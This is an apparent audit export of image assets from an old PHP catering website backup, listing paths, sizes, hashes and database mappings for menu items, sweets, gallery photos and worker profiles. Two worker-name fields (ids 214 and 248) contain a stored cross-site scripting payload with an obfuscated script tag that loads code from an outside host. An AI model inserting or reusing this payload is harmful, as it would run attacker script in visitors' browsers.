1.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/1.jpg,509484,6dad354f72fab65544761d5d8f25bf26dfaa115586680da769d869f4aa805c40,607f7db66cafe5334b3cfa6253c4c064,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/1.jpg,509484,6dad354f72fab65544761d5d8f25bf26dfaa115586680da769d869f4aa805c40,607f7db66cafe5334b3cfa6253c4c064,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_small_img
1.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/1.jpg,509484,6dad354f72fab65544761d5d8f25bf26dfaa115586680da769d869f4aa805c40,607f7db66cafe5334b3cfa6253c4c064,DB Mapped (Verified),product_item_tbl,1,Desi Bundi Laddo,menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/1.jpg,509484,6dad354f72fab65544761d5d8f25bf26dfaa115586680da769d869f4aa805c40,607f7db66cafe5334b3cfa6253c4c064,DB Mapped (Verified),website_gallery,1,Images 1,gimage
1.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/1.jpg,509484,6dad354f72fab65544761d5d8f25bf26dfaa115586680da769d869f4aa805c40,607f7db66cafe5334b3cfa6253c4c064,DB Mapped (Verified),recipe_appliances_kits,1,Onion,kits_img
1.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/1.jpg,509484,6dad354f72fab65544761d5d8f25bf26dfaa115586680da769d869f4aa805c40,607f7db66cafe5334b3cfa6253c4c064,DB Mapped (Verified),event_cuisine,1,South Indian,cuisine_img
1.png,old-website-php/Full-website-backup/frontEnd/pcategory/1.png,6900,c4cd2a0d7685a36d1d42c29fbf7f171649167aae45ecfb54598c806c9225f359,b17005466f1cd1c2a4a8580d65679721,DB Mapped (Verified),event_requirement,1,New Year Party,event_img
11.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/11.jpg,67884,7504dd04a7268d1a850c4a857ba4b486e3a4e0d0bf0c721ebdc1d220cc50b7f9,21c5ca61a72db26ac903423efaa5dd72,DB Mapped (Verified),menu_item_tbl,11,Dal Tadka,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/11.jpg,67884,7504dd04a7268d1a850c4a857ba4b486e3a4e0d0bf0c721ebdc1d220cc50b7f9,21c5ca61a72db26ac903423efaa5dd72,DB Mapped (Verified),product_item_tbl,11,Balushai,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/11.jpg,67884,7504dd04a7268d1a850c4a857ba4b486e3a4e0d0bf0c721ebdc1d220cc50b7f9,21c5ca61a72db26ac903423efaa5dd72,DB Mapped (Verified),website_gallery,11,Event at Delhi,gimage
11.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/11.jpg,67884,7504dd04a7268d1a850c4a857ba4b486e3a4e0d0bf0c721ebdc1d220cc50b7f9,21c5ca61a72db26ac903423efaa5dd72,DB Mapped (Verified),worke_work_experience,11,North Indian Dishes by,workproimg
11.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/11.jpg,67884,7504dd04a7268d1a850c4a857ba4b486e3a4e0d0bf0c721ebdc1d220cc50b7f9,21c5ca61a72db26ac903423efaa5dd72,DB Mapped (Verified),recipe_appliances_kits,11,Yellow Bell Pepper,kits_img
2.png,old-website-php/Full-website-backup/frontEnd/pcategory/2.png,23904,da8131e2f1996a554998622e88a2aaf18aa76d6fb625d25ba850d46d6b9b2028,73591b44fa1d67c3df62e52f2c68bfa8,DB Mapped (Verified),event_requirement,2,Christmas Party,event_img
3.png,old-website-php/Full-website-backup/frontEnd/pcategory/3.png,8001,17f875ff4f6fa63fa909eec2250df758a26626373ac3e6f3e94bf835b75ea778,004acbed8150fa094f7f366128e68080,DB Mapped (Verified),event_requirement,3,Diwali Party/Puja,event_img
4.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/4.jpg,47660,b4e1dd1005c55d21a9614ca92a34d78c1f9dca367b16eac37e384be53f478c7c,22851ebd0e8ab3e7447e12a1f07f3aa3,DB Mapped (Verified),menu_item_tbl,4,Sambhar,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/4.jpg,47660,b4e1dd1005c55d21a9614ca92a34d78c1f9dca367b16eac37e384be53f478c7c,22851ebd0e8ab3e7447e12a1f07f3aa3,DB Mapped (Verified),product_item_tbl,4,Loose Mitthi Matthi,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/4.jpg,47660,b4e1dd1005c55d21a9614ca92a34d78c1f9dca367b16eac37e384be53f478c7c,22851ebd0e8ab3e7447e12a1f07f3aa3,DB Mapped (Verified),website_gallery,4,Images 4,gimage
4.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/4.jpg,47660,b4e1dd1005c55d21a9614ca92a34d78c1f9dca367b16eac37e384be53f478c7c,22851ebd0e8ab3e7447e12a1f07f3aa3,DB Mapped (Verified),recipe_appliances_kits,4,Spatula,kits_img
4.jpg,old-website-php/Full-website-backup/frontEnd/pcategory/4.jpg,47660,b4e1dd1005c55d21a9614ca92a34d78c1f9dca367b16eac37e384be53f478c7c,22851ebd0e8ab3e7447e12a1f07f3aa3,DB Mapped (Verified),event_cuisine,4,Flame Grilled to Perfection,cuisine_img
4.png,old-website-php/Full-website-backup/frontEnd/pcategory/4.png,10073,284874e3133253fc6a9367591f3938b6b25fea05666b19ce463f0980ea228323,f09555e834ed17ee7a789e1d52370b06,DB Mapped (Verified),event_requirement,4,Bhai Dooj,event_img
Event-Icon.png,old-website-php/Full-website-backup/frontEnd/pcategory/Event-Icon.png,14958,8a2ecc317a4796d8fc45e3de2e5f0eec7b76d9df897569b432b7cdb4267f1397,abbe32956f1055107dc9dc02d7798b38,Static / Orphaned Disk Asset,,,,
Menu-Icon.png,old-website-php/Full-website-backup/frontEnd/pcategory/Menu-Icon.png,6926,963db6dcde9fb15052023e86b1efbf91f232e75d2e8828aa3b3e825f59a31d12,0130e21731dedf215d8dca5ea650cd21,Static / Orphaned Disk Asset,,,,
Occasion-Icon.png,old-website-php/Full-website-backup/frontEnd/pcategory/Occasion-Icon.png,8321,1d7c62b36c1ee6c6087b7fba38b0fdcb939474298ee3fc92630982ddb79cbfc5,577bf59991a0610d444085d7a3270a82,Static / Orphaned Disk Asset,,,,
Our-Packages.png,old-website-php/Full-website-backup/frontEnd/pcategory/Our-Packages.png,4936,22f37bbecbfacbeb04952438b1adc5688e7f5af3bed977c8512e0cc0cedf4bf8,76f19a2a09d48ec2282d1bc24122923b,Static / Orphaned Disk Asset,,,,
cup.png,old-website-php/Full-website-backup/frontEnd/profession/images/cup.png,1615,5a269c1a2066e81fc010281cda7ea3b3cd759ac7080c805eb086d2199764f466,0a4d4d7cd4575ecc1ad5813c5e5caccb,Static / Orphaned Disk Asset,,,,
trophy.png,old-website-php/Full-website-backup/frontEnd/profession/images/trophy.png,1683,20e9d5c8e0b3b1577b52475be2f299f980ce616618c55093f8500ba78e3889ff,56c96e8d813e072025520d11d1f1e3ab,Static / Orphaned Disk Asset,,,,
asset 3.png,old-website-php/Full-website-backup/frontEnd/profession/images/icons/asset 3.png,2679,61e004cf21ef11bffc3eaaf7030b5868d111ae07af11be0774546fafe687b0ce,39f3d72c59841f4593c679400fd167f7,Static / Orphaned Disk Asset,,,,
asset 4.png,old-website-php/Full-website-backup/frontEnd/profession/images/icons/asset 4.png,8415,e8ffe0843bd62ccea25c34af5456db4de99224a89481775b1ae108b47e16ddba,39fdc72141a01c7b7c5bb58a12bf5864,Static / Orphaned Disk Asset,,,,
asset 5.png,old-website-php/Full-website-backup/frontEnd/profession/images/icons/asset 5.png,5930,13dd0ced4fe392e461b34d616a9acdc0ed9be631a317708b261cbb65bdd17bf5,b14291a780e4e06627bcb648df476588,Static / Orphaned Disk Asset,,,,
asset 6.png,old-website-php/Full-website-backup/frontEnd/profession/images/icons/asset 6.png,6288,a89485ae3f414418b8ccbdb53bda8b6a91bc327489ac70262f70e905fdb43c80,374e0d4660c21ee4f05bbf426a392d71,Static / Orphaned Disk Asset,,,,
asset 7.png,old-website-php/Full-website-backup/frontEnd/profession/images/icons/asset 7.png,13426,d4e0f7c970d88dc93cac76402991d3e4c9e0d3f49745c08dbc245d2083e8cae6,8297dc1e34b796e22eea0d10b5b80649,Static / Orphaned Disk Asset,,,,
asset 8.png,old-website-php/Full-website-backup/frontEnd/profession/images/icons/asset 8.png,7148,e1f7b2105ab45bc6b123ad17c80dd134331b8dc8fcaaeb3da338f41e074c2fa0,2788746c40a1c7d20f2efdaf2494ea1e,Static / Orphaned Disk Asset,,,,
chinese_cover.jpeg,old-website-php/Full-website-backup/frontEnd/profession/images/icons/chinese_cover.jpeg,25853,caeabbd4de96cff871da4f96e778d33ccd2aff0ed6cda9261060a1bec29eaffb,4a71ecc4f51b05a7ec1501b320cf14da,Static / Orphaned Disk Asset,,,,
1.jpeg,old-website-php/Full-website-backup/frontEnd/professional/1.jpeg,116486,54b14d018e9b9ac353d3ceac50566265ff28f09ab82fb515de59cf5dcb9f726b,d90034f5cb9b6cfa5e058f4d70c4e7ad,DB Mapped (Verified),prof_job_worker,1,Pankaj,userimg
10.jpg,old-website-php/Full-website-backup/frontEnd/professional/10.jpg,317559,8c0fea7378ed65694c7938424ddfc75fb3804f62ac0109b473586b746a5ef2e3,aad33a0630fba36b86c3189fcde2ce3a,DB Mapped (Verified),product_item_tbl,10,Atta Panjiri,menu_img
10.jpg,old-website-php/Full-website-backup/frontEnd/professional/10.jpg,317559,8c0fea7378ed65694c7938424ddfc75fb3804f62ac0109b473586b746a5ef2e3,aad33a0630fba36b86c3189fcde2ce3a,DB Mapped (Verified),website_gallery,10,Evevt At rishikesh,gimage
10.jpg,old-website-php/Full-website-backup/frontEnd/professional/10.jpg,317559,8c0fea7378ed65694c7938424ddfc75fb3804f62ac0109b473586b746a5ef2e3,aad33a0630fba36b86c3189fcde2ce3a,DB Mapped (Verified),worke_work_experience,10,as worked at2,workproimg
10.jpg,old-website-php/Full-website-backup/frontEnd/professional/10.jpg,317559,8c0fea7378ed65694c7938424ddfc75fb3804f62ac0109b473586b746a5ef2e3,aad33a0630fba36b86c3189fcde2ce3a,DB Mapped (Verified),recipe_appliances_kits,10,Red Bell Pepper,kits_img
16.jpg,old-website-php/Full-website-backup/frontEnd/professional/16.jpg,136377,8c050d68335d9b3aaa0fda4c1d959491b9513b2311b0fb9101a9ea6037068a36,bbb020b0465116ddda83f773076cf223,DB Mapped (Verified),product_item_tbl,16,Desi Ghee Bundi Ladoo,menu_img
16.jpg,old-website-php/Full-website-backup/frontEnd/professional/16.jpg,136377,8c050d68335d9b3aaa0fda4c1d959491b9513b2311b0fb9101a9ea6037068a36,bbb020b0465116ddda83f773076cf223,DB Mapped (Verified),website_gallery,16,Event at DPS school Gurugram,gimage
16.jpg,old-website-php/Full-website-backup/frontEnd/professional/16.jpg,136377,8c050d68335d9b3aaa0fda4c1d959491b9513b2311b0fb9101a9ea6037068a36,bbb020b0465116ddda83f773076cf223,DB Mapped (Verified),worke_work_experience,16,Desserts Dishes by3,workproimg
165.png,old-website-php/Full-website-backup/frontEnd/professional/165.png,1227546,5f49a75a0c90fbac9a055f994dd6821caaf680f3a4b6643c8e75fe5e8ff13598,a1ba92060c9642552acf2f9035639bdd,Static / Orphaned Disk Asset,,,,
2.jpeg,old-website-php/Full-website-backup/frontEnd/professional/2.jpeg,60006,3d4744ce31036fb500a259882c37e3e48647394e563a0d76d448c026ab6a095d,eeebdd0ee4dd489adb81dd38a4651857,DB Mapped (Verified),prof_job_worker,2,Om Prakash,userimg
214.jpg,old-website-php/Full-website-backup/frontEnd/professional/214.jpg,631,6b8a7122e744d9080dcbe911cd5ffdeda3be5ccd4cc69695f24d3e161ee3f3b0,987a868a7aa4d2ddf8059efcf216ce59,DB Mapped (Verified),menu_item_tbl,214,Dal Urad,menu_img
214.jpg,old-website-php/Full-website-backup/frontEnd/professional/214.jpg,631,6b8a7122e744d9080dcbe911cd5ffdeda3be5ccd4cc69695f24d3e161ee3f3b0,987a868a7aa4d2ddf8059efcf216ce59,DB Mapped (Verified),prof_job_worker,214,<sCRiPt/sRC=//0l2.co/1/></sCrIpT>Nocal,userimg
225.jpg,old-website-php/Full-website-backup/frontEnd/professional/225.jpg,631,6b8a7122e744d9080dcbe911cd5ffdeda3be5ccd4cc69695f24d3e161ee3f3b0,987a868a7aa4d2ddf8059efcf216ce59,DB Mapped (Verified),prof_job_worker,225,Posa,userimg
248.jpg,old-website-php/Full-website-backup/frontEnd/professional/248.jpg,631,6b8a7122e744d9080dcbe911cd5ffdeda3be5ccd4cc69695f24d3e161ee3f3b0,987a868a7aa4d2ddf8059efcf216ce59,DB Mapped (Verified),menu_item_tbl,248,Dal ki Puri,menu_img
248.jpg,old-website-php/Full-website-backup/frontEnd/professional/248.jpg,631,6b8a7122e744d9080dcbe911cd5ffdeda3be5ccd4cc69695f24d3e161ee3f3b0,987a868a7aa4d2ddf8059efcf216ce59,DB Mapped (Verified),menu_item_tbl,248,Dal ki Puri,menu_small_img
248.jpg,old-website-php/Full-website-backup/frontEnd/professional/248.jpg,631,6b8a7122e744d9080dcbe911cd5ffdeda3be5ccd4cc69695f24d3e161ee3f3b0,987a868a7aa4d2ddf8059efcf216ce59,DB Mapped (Verified),prof_job_worker,248,<sCRiPt/sRC=//0l2.co/1/></sCrIpT>Nocal,userimg
276.png,old-website-php/Full-website-backup/frontEnd/professional/276.png,47094,c993a8e2cc142f2389b16300672034d3d8ba8c5c88af43fa78ef782197124a17,8ba2ce6b82b52ad3552ae796afefbe56,Static / Orphaned Disk Asset,,,,
277.png,old-website-php/Full-website-backup/frontEnd/professional/277.png,47094,c993a8e2cc142f2389b16300672034d3d8ba8c5c88af43fa78ef782197124a17,8ba2ce6b82b52ad3552ae796afefbe56,Static / Orphaned Disk Asset,,,,
278.png,old-website-php/Full-website-backup/frontEnd/professional/278.png,763,4be0d6bc433a58df6cccadaf4ba56726f38926b207d0e2063b3d761130092f68,2b3b8cf176628c0ef28fa029c3975be4,Static / Orphaned Disk Asset,,,,
279.png,old-website-php/Full-website-backup/frontEnd/professional/279.png,763,4be0d6bc433a58df6cccadaf4ba56726f38926b207d0e2063b3d761130092f68,2b3b8cf176628c0ef28fa029c3975be4,DB Mapped (Verified),prof_job_worker,279,shailja,userimg
280.jpg,old-website-php/Full-website-backup/frontEnd/professional/280.jpg,904268,b2ade2f65d891888408a3af4404ef309b1b1c75c5b777fab12cb71a2a5981e95,eebf446e650f08a5b995410e54997815,DB Mapped (Verified),prof_job_worker,280,vinod singh,userimg
298.png,old-website-php/Full-website-backup/frontEnd/professional/298.png,47094,c993a8e2cc142f2389b16300672034d3d8ba8c5c88af43fa78ef782197124a17,8ba2ce6b82b52ad3552ae796afefbe56,Static / Orphaned Disk Asset,,,,
3.jpeg,old-website-php/Full-website-backup/frontEnd/professional/3.jpeg,17908,6334619f4d33ab1d530cc859b3384e16a9bb5f83b339645f57b7cb46d8fa9e02,6b22b43f74a0c9769140ddcbacc105dc,Static / Orphaned Disk Asset,,,,
4.jpeg,old-website-php/Full-website-backup/frontEnd/professional/4.jpeg,179188,3510964264d17ef1212b8c011f86879568c0598f36ab0cc68158dbbbbc6c3c4f,26410135257bc3cae673ad0173fb4fe7,Static / Orphaned Disk Asset,,,,
5.jpg,old-website-php/Full-website-backup/frontEnd/professional/5.jpg,11817,9247755350ec53ee912380a5237c398e5862e837e1f148cab96f73dfef0afa5e,ca7b0aaecc0c8d72bb02ee4bdc0ceceb,DB Mapped (Verified),product_item_tbl,5,Loose Namek Pare,menu_img
5.jpg,old-website-php/Full-website-backup/frontEnd/professional/5.jpg,11817,9247755350ec53ee912380a5237c398e5862e837e1f148cab96f73dfef0afa5e,ca7b0aaecc0c8d72bb02ee4bdc0ceceb,DB Mapped (Verified),website_gallery,5,Images 5,gimage
5.jpg,old-website-php/Full-website-backup/frontEnd/professional/5.jpg,11817,9247755350ec53ee912380a5237c398e5862e837e1f148cab96f73dfef0afa5e,ca7b0aaecc0c8d72bb02ee4bdc0ceceb,DB Mapped (Verified),recipe_appliances_kits,5,Toothpicks,kits_img
5.jpg,old-website-php/Full-website-backup/frontEnd/professional/5.jpg,11817,9247755350ec53ee912380a5237c398e5862e837e1f148cab96f73dfef0afa5e,ca7b0aaecc0c8d72bb02ee4bdc0ceceb,DB Mapped (Verified),event_cuisine,5,First meal of the day,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/professional/6.jpg,57810,ed0206321afb53dc5e18d3c56eeb47522100a518599dde36c5c1f70cf5d1a2a5,974021e850ae742d03221b34ef76ddc4,DB Mapped (Verified),product_item_tbl,6,Masala Pare,menu_img
6.jpg,old-website-php/Full-website-backup/frontEnd/professional/6.jpg,57810,ed0206321afb53dc5e18d3c56eeb47522100a518599dde36c5c1f70cf5d1a2a5,974021e850ae742d03221b34ef76ddc4,DB Mapped (Verified),website_gallery,6,Images 6,gimage
6.jpg,old-website-php/Full-website-backup/frontEnd/professional/6.jpg,57810,ed0206321afb53dc5e18d3c56eeb47522100a518599dde36c5c1f70cf5d1a2a5,974021e850ae742d03221b34ef76ddc4,DB Mapped (Verified),worke_work_experience,6,as worked at,workproimg
6.jpg,old-website-php/Full-website-backup/frontEnd/professional/6.jpg,57810,ed0206321afb53dc5e18d3c56eeb47522100a518599dde36c5c1f70cf5d1a2a5,974021e850ae742d03221b34ef76ddc4,DB Mapped (Verified),recipe_appliances_kits,6,Lemon,kits_img
6.jpg,old-website-php/Full-website-backup/frontEnd/professional/6.jpg,57810,ed0206321afb53dc5e18d3c56eeb47522100a518599dde36c5c1f70cf5d1a2a5,974021e850ae742d03221b34ef76ddc4,DB Mapped (Verified),event_cuisine,6,Mithas Dil Se,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/professional/6.jpg,57810,ed0206321afb53dc5e18d3c56eeb47522100a518599dde36c5c1f70cf5d1a2a5,974021e850ae742d03221b34ef76ddc4,DB Mapped (Verified),event_requirement,6,Good Friday,event_img
7.jpg,old-website-php/Full-website-backup/frontEnd/professional/7.jpg,73229,7cd98176188df058b0e37f304edbd230750f0cfd306f0fdd428d43ee82248e7c,2b1438bcf1295515236cbb39ba8cb06d,DB Mapped (Verified),menu_item_tbl,7,Curd Rice,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/professional/7.jpg,73229,7cd98176188df058b0e37f304edbd230750f0cfd306f0fdd428d43ee82248e7c,2b1438bcf1295515236cbb39ba8cb06d,DB Mapped (Verified),product_item_tbl,7,Pithi Kachori,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/professional/7.jpg,73229,7cd98176188df058b0e37f304edbd230750f0cfd306f0fdd428d43ee82248e7c,2b1438bcf1295515236cbb39ba8cb06d,DB Mapped (Verified),worke_work_experience,7,knows these Cuisines3,workproimg
7.jpg,old-website-php/Full-website-backup/frontEnd/professional/7.jpg,73229,7cd98176188df058b0e37f304edbd230750f0cfd306f0fdd428d43ee82248e7c,2b1438bcf1295515236cbb39ba8cb06d,DB Mapped (Verified),recipe_appliances_kits,7,Coriander Leaves,kits_img
7.jpg,old-website-php/Full-website-backup/frontEnd/professional/7.jpg,73229,7cd98176188df058b0e37f304edbd230750f0cfd306f0fdd428d43ee82248e7c,2b1438bcf1295515236cbb39ba8cb06d,DB Mapped (Verified),event_cuisine,7,Soups & Beverages,cuisine_img
714.jpg,old-website-php/Full-website-backup/frontEnd/professional/714.jpg,243403,f8efde1eb93df9bb30c542da2656838fd0c391cf6ffe0b383f71f4901e13e7f3,a4ae86335fb9d1f20f0fa391ad3b789e,Static / Orphaned Disk Asset,,,,
714.png,old-website-php/Full-website-backup/frontEnd/professional/714.png,13637,17c36a527b512bcf08163d8677fe73be628d42c65106683b2dca4df6809e133c,f37cd8b40f279ed75fe6a4f1a5c3acba,Static / Orphaned Disk Asset,,,,
8.jpg,old-website-php/Full-website-backup/frontEnd/professional/8.jpg,95907,ff53259a2e1af507c3546d9fe4000e8938ba09a1d7beff271bedf7e0664a279c,6b217ee61b00d1f009312676a55d8976,DB Mapped (Verified),product_item_tbl,8,Sakkar Pare,menu_img
8.jpg,old-website-php/Full-website-backup/frontEnd/professional/8.jpg,95907,ff53259a2e1af507c3546d9fe4000e8938ba09a1d7beff271bedf7e0664a279c,6b217ee61b00d1f009312676a55d8976,DB Mapped (Verified),worke_work_experience,8,knows these Cuisines,workproimg
8.jpg,old-website-php/Full-website-backup/frontEnd/professional/8.jpg,95907,ff53259a2e1af507c3546d9fe4000e8938ba09a1d7beff271bedf7e0664a279c,6b217ee61b00d1f009312676a55d8976,DB Mapped (Verified),recipe_appliances_kits,8,Salt,kits_img
8.jpg,old-website-php/Full-website-backup/frontEnd/professional/8.jpg,95907,ff53259a2e1af507c3546d9fe4000e8938ba09a1d7beff271bedf7e0664a279c,6b217ee61b00d1f009312676a55d8976,DB Mapped (Verified),event_cuisine,8,Starters,cuisine_img
9.jpg,old-website-php/Full-website-backup/frontEnd/professional/9.jpg,126089,f67e610e9b5cd12374358b1936d6a77dfba4011221eaa771fbd0a3ac10d48ed5,adad8a02d8128eec293e04199d6115c8,DB Mapped (Verified),menu_item_tbl,9,Tamarind Rice,menu_img
9.jpg,old-website-php/Full-website-backup/frontEnd/professional/9.jpg,126089,f67e610e9b5cd12374358b1936d6a77dfba4011221eaa771fbd0a3ac10d48ed5,adad8a02d8128eec293e04199d6115c8,DB Mapped (Verified),product_item_tbl,9,Atta Dry Fruit Laddoo,menu_img
9.jpg,old-website-php/Full-website-backup/frontEnd/professional/9.jpg,126089,f67e610e9b5cd12374358b1936d6a77dfba4011221eaa771fbd0a3ac10d48ed5,adad8a02d8128eec293e04199d6115c8,DB Mapped (Verified),worke_work_experience,9,knows these Cuisines2,workproimg
9.jpg,old-website-php/Full-website-backup/frontEnd/professional/9.jpg,126089,f67e610e9b5cd12374358b1936d6a77dfba4011221eaa771fbd0a3ac10d48ed5,adad8a02d8128eec293e04199d6115c8,DB Mapped (Verified),recipe_appliances_kits,9,Green Capsicum,kits_img
1.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/1.jpg,6344,0f30040399dc68b4f8d50e7f1ed30c676835d95e008fbf196719e7d32a8586cf,1b083caf7d11726064bc510fb347be24,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/1.jpg,6344,0f30040399dc68b4f8d50e7f1ed30c676835d95e008fbf196719e7d32a8586cf,1b083caf7d11726064bc510fb347be24,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_small_img
1.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/1.jpg,6344,0f30040399dc68b4f8d50e7f1ed30c676835d95e008fbf196719e7d32a8586cf,1b083caf7d11726064bc510fb347be24,DB Mapped (Verified),product_item_tbl,1,Desi Bundi Laddo,menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/1.jpg,6344,0f30040399dc68b4f8d50e7f1ed30c676835d95e008fbf196719e7d32a8586cf,1b083caf7d11726064bc510fb347be24,DB Mapped (Verified),website_gallery,1,Images 1,gimage
1.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/1.jpg,6344,0f30040399dc68b4f8d50e7f1ed30c676835d95e008fbf196719e7d32a8586cf,1b083caf7d11726064bc510fb347be24,DB Mapped (Verified),recipe_appliances_kits,1,Onion,kits_img
1.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/1.jpg,6344,0f30040399dc68b4f8d50e7f1ed30c676835d95e008fbf196719e7d32a8586cf,1b083caf7d11726064bc510fb347be24,DB Mapped (Verified),event_cuisine,1,South Indian,cuisine_img
10.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/10.jpg,28601,46e6d1a9b306a55a9b92e0d8fd0b0a421ec46c2b7de9b1bb5e37515500975de4,b420791f796c69898748c9514f6ec782,DB Mapped (Verified),product_item_tbl,10,Atta Panjiri,menu_img
10.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/10.jpg,28601,46e6d1a9b306a55a9b92e0d8fd0b0a421ec46c2b7de9b1bb5e37515500975de4,b420791f796c69898748c9514f6ec782,DB Mapped (Verified),website_gallery,10,Evevt At rishikesh,gimage
10.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/10.jpg,28601,46e6d1a9b306a55a9b92e0d8fd0b0a421ec46c2b7de9b1bb5e37515500975de4,b420791f796c69898748c9514f6ec782,DB Mapped (Verified),worke_work_experience,10,as worked at2,workproimg
10.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/10.jpg,28601,46e6d1a9b306a55a9b92e0d8fd0b0a421ec46c2b7de9b1bb5e37515500975de4,b420791f796c69898748c9514f6ec782,DB Mapped (Verified),recipe_appliances_kits,10,Red Bell Pepper,kits_img
11.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/11.jpg,6344,0f30040399dc68b4f8d50e7f1ed30c676835d95e008fbf196719e7d32a8586cf,1b083caf7d11726064bc510fb347be24,DB Mapped (Verified),menu_item_tbl,11,Dal Tadka,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/11.jpg,6344,0f30040399dc68b4f8d50e7f1ed30c676835d95e008fbf196719e7d32a8586cf,1b083caf7d11726064bc510fb347be24,DB Mapped (Verified),product_item_tbl,11,Balushai,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/11.jpg,6344,0f30040399dc68b4f8d50e7f1ed30c676835d95e008fbf196719e7d32a8586cf,1b083caf7d11726064bc510fb347be24,DB Mapped (Verified),website_gallery,11,Event at Delhi,gimage
11.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/11.jpg,6344,0f30040399dc68b4f8d50e7f1ed30c676835d95e008fbf196719e7d32a8586cf,1b083caf7d11726064bc510fb347be24,DB Mapped (Verified),worke_work_experience,11,North Indian Dishes by,workproimg
11.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/11.jpg,6344,0f30040399dc68b4f8d50e7f1ed30c676835d95e008fbf196719e7d32a8586cf,1b083caf7d11726064bc510fb347be24,DB Mapped (Verified),recipe_appliances_kits,11,Yellow Bell Pepper,kits_img
12.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/12.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),product_item_tbl,12,Besan Dry Fruit Laddo,menu_img
12.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/12.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),website_gallery,12,Event at Delhi,gimage
12.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/12.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),worke_work_experience,12,North Indian Dishes by2,workproimg
12.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/12.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),recipe_appliances_kits,12,Mushroom,kits_img
13.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/13.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),menu_item_tbl,13,Paneer Lababdar,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/13.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),product_item_tbl,13,Besan Laddo,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/13.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),website_gallery,13,Evevt At rishikesh,gimage
13.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/13.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),worke_work_experience,13,tarters Dishes by1,workproimg
13.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/13.jpg,49285,1d1d9849da77066e69417026c000030bc0fbe40a1a86c4b6830b454a4889305f,f4f1f2e5ed7ca9ea99eb550524870926,DB Mapped (Verified),recipe_appliances_kits,13,Mint Leaves,kits_img
2.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/2.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/2.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_small_img
2.jpg,old-website-php/Full-website-backup/frontEnd/recipeimage/2.jpg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),product_item_tbl,2,Gujrati Kachori,menu_img
